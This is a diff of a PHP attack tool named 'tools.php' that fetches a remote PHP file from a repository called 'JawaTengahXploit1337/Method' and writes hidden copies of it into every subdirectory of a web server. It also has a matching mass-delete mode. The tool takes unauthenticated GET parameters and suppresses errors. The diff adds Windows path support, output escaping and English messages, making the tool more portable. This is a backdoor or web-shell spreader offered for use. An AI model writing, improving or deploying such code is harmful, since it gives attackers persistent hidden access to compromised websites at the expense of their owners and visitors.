@@ -1,10 +1,18 @@
 <?php
-// - Upload: tools.php?dir=/path/to/directory
-// - Delete: tools.php?delete=/path/to/directory
+// Script Mass Upload/Delete File (Support Windows & Linux)
+// Upload: tools.php?dir=C:/xampp/htdocs
+// Delete: tools.php?delete=C:/xampp/htdocs
+
 error_reporting(0);
 set_time_limit(0);
 
 $file_url = "https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/lolb.php";
+
+function normalizePath($path) {
+    $path = str_replace('\\', '/', $path);
+    $path = rtrim($path, '/');
+    return $path;
+}
 
 function downloadFile($url) {
     $ch = curl_init();
@@ -18,9 +26,10 @@ function downloadFile($url) {
 
 function deleteUploadedFiles($base_dir) {
     $result = [];
-  
+    $base_dir = normalizePath($base_dir);
+    
     if (!is_dir($base_dir)) {
-        return ["error" => "Direktori tidak valid"];
+        return ["error" => "Invalid directory"];
     }
     
     $dir_iterator = new RecursiveDirectoryIterator($base_dir, RecursiveDirectoryIterator::SKIP_DOTS);
@@ -30,7 +39,7 @@ function deleteUploadedFiles($base_dir) {
         if ($file->isDir()) {
             $dir_path = $file->getPathname();
             $dir_name = basename($dir_path);
-            $target_file = $dir_path . '/.' . $dir_name . '.php';
+            $target_file = normalizePath($dir_path) . '/.' . $dir_name . '.php';
             
             if (file_exists($target_file)) {
                 if (unlink($target_file)) {
@@ -41,24 +50,23 @@ function deleteUploadedFiles($base_dir) {
             }
         }
     }
-    
     return $result;
 }
 
 function processDirectories($base_dir) {
     global $file_url;
-    
     $result = [];
+    $base_dir = normalizePath($base_dir);
     
     if (!is_dir($base_dir)) {
-        return ["error" => "Direktori tidak valid"];
+        return ["error" => "Invalid directory"];
     }
-
+    
     $file_content = downloadFile($file_url);
     if (empty($file_content)) {
-        return ["error" => "Gagal mendownload file dari URL"];
+        return ["error" => "Failed to download file"];
     }
-
+    
     $dir_iterator = new RecursiveDirectoryIterator($base_dir, RecursiveDirectoryIterator::SKIP_DOTS);
     $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
     
@@ -66,7 +74,7 @@ function processDirectories($base_dir) {
         if ($file->isDir()) {
             $dir_path = $file->getPathname();
             $dir_name = basename($dir_path);
-            $target_file = $dir_path . '/.' . $dir_name . '.php';
+            $target_file = normalizePath($dir_path) . '/.' . $dir_name . '.php';
             
             if (file_put_contents($target_file, $file_content)) {
                 $result['uploaded'][] = $target_file;
@@ -75,58 +83,53 @@ function processDirectories($base_dir) {
             }
         }
     }
-    
     return $result;
 }
 
 if (isset($_GET['delete']) && !empty($_GET['delete'])) {
-    $base_directory = rtrim($_GET['delete'], '/');
+    $base_directory = $_GET['delete'];
     $result = deleteUploadedFiles($base_directory);
     
-    echo "<h2>Hasil Delete Massal</h2>";
-    echo "<p>Direktori dasar: <strong>$base_directory</strong></p>";
+    echo "<h2>Delete Results</h2>";
+    echo "<p>Base directory: <strong>".htmlspecialchars($base_directory)."</strong></p>";
     
     if (isset($result['error'])) {
-        echo "<div style='color:red;'>{$result['error']}</div>";
+        echo "<div style='color:red;'>".htmlspecialchars($result['error'])."</div>";
     } else {
-        echo "<h3>File Berhasil Dihapus:</h3>";
-        echo "<ul>";
+        echo "<h3>Deleted files:</h3><ul>";
         foreach ($result['deleted'] as $file) {
-            echo "<li>$file</li>";
+            echo "<li>".htmlspecialchars($file)."</li>";
         }
         echo "</ul>";
         
         if (!empty($result['failed'])) {
-            echo "<h3>File Gagal Dihapus:</h3>";
-            echo "<ul>";
+            echo "<h3>Failed to delete:</h3><ul>";
             foreach ($result['failed'] as $file) {
-                echo "<li>$file</li>";
+                echo "<li>".htmlspecialchars($file)."</li>";
             }
             echo "</ul>";
         }
     }
 } elseif (isset($_GET['dir']) && !empty($_GET['dir'])) {
-    $base_directory = rtrim($_GET['dir'], '/');
+    $base_directory = $_GET['dir'];
     $result = processDirectories($base_directory);
     
-    echo "<h2>Hasil Upload Massal</h2>";
-    echo "<p>Direktori dasar: <strong>$base_directory</strong></p>";
+    echo "<h2>Upload Results</h2>";
+    echo "<p>Base directory: <strong>".htmlspecialchars($base_directory)."</strong></p>";
     
     if (isset($result['error'])) {
-        echo "<div style='color:red;'>{$result['error']}</div>";
+        echo "<div style='color:red;'>".htmlspecialchars($result['error'])."</div>";
     } else {
-        echo "<h3>File Berhasil Diupload:</h3>";
-        echo "<ul>";
+        echo "<h3>Uploaded files:</h3><ul>";
         foreach ($result['uploaded'] as $file) {
-            echo "<li>$file</li>";
+            echo "<li>".htmlspecialchars($file)."</li>";
         }
         echo "</ul>";
         
         if (!empty($result['failed'])) {
-            echo "<h3>File Gagal Diupload:</h3>";
-            echo "<ul>";
+            echo "<h3>Failed to upload:</h3><ul>";
             foreach ($result['failed'] as $file) {
-                echo "<li>$file</li>";
+                echo "<li>".htmlspecialchars($file)."</li>";
             }
             echo "</ul>";
         }
